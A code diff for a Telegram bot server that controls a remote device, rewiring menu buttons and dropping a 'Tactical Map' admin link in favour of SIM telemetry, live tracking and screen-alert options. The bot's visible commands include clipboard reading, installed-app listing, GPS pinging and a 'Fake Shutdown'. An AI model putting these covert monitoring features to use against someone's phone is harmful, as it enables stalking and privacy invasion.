@@ -699,8 +699,8 @@ const DASHBOARD_KEYBOARD = {
       { text: '🌐 Network Info', callback_data: 'cmd:network' }
     ],
     [
-      { text: '🗺️ Tactical Map', url: 'https://pasa.izhaanintellect.fun/admin' },
-      { text: '📋 Clipboard', callback_data: 'cmd:clipboard' }
+      { text: '📋 Clipboard', callback_data: 'cmd:clipboard' },
+      { text: '📶 SIM Telemetry', callback_data: 'cmd:sim' }
     ],
     [
       { text: '📦 Installed Apps', callback_data: 'cmd:apps' },
@@ -1768,31 +1768,13 @@ async function handleTelegramUpdate(token, update) {
     return;
   }
 
-  // Handle Tactical Map link request
-  if (lowerText.includes('tactical map') || lowerText === 'map') {
-    await callTelegram(token, 'sendMessage', {
-      chat_id: chatId,
-      text: '🗺️ <b>PASA Tactical Mission Control Map</b>\n━━━━━━━━━━━━━━━━━━━━\nReal-time high-resolution GPS tracking, movement breadcrumb trail, and radar telemetry.',
-      parse_mode: 'HTML',
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '🗺️ Open Tactical Map', url: 'https://pasa.izhaanintellect.fun/admin' },
-            { text: '📍 Instant GPS Ping', callback_data: 'cmd:locate' }
-          ]
-        ]
-      }
-    });
-    return;
-  }
-
   // Natural Language & Persistent Keyboard Mapping
   if (lowerText.includes('status') || lowerText.includes('battery')) {
     await dispatchCommandToDevice(token, chatId, '/status', []);
     return;
   }
 
-  if (lowerText.includes('locate') || lowerText.includes('location') || lowerText.includes('gps') || lowerText === 'where') {
+  if (lowerText.includes('locate') || lowerText.includes('location') || lowerText.includes('gps') || lowerText === 'where' || lowerText === 'map' || lowerText.includes('tactical map')) {
     await dispatchCommandToDevice(token, chatId, '/locate', []);
     return;
   }
@@ -2690,7 +2672,7 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
           inline_keyboard: [
             [
               { text: '🔄 Refresh GPS', callback_data: 'cmd:locate' },
-              { text: '🗺️ Tactical Map', url: 'https://pasa.izhaanintellect.fun/admin' }
+              { text: '📍 Live Tracking', callback_data: 'menu:track' }
             ],
             [
               { text: '🚨 Sound Siren', callback_data: 'cmd:ring:60' },
@@ -2776,7 +2758,7 @@ app.post('/api/device/alert', verifyDeviceProofOrBearer, upload.fields([
         ],
         [
           { text: '🕶️ Fake Shutdown', callback_data: 'cmd:fakeshutdown' },
-          { text: '🗺️ Tactical Map', url: 'https://pasa.izhaanintellect.fun/admin' }
+          { text: '💬 Screen Alert', callback_data: 'menu:message' }
         ]
       ]
     };
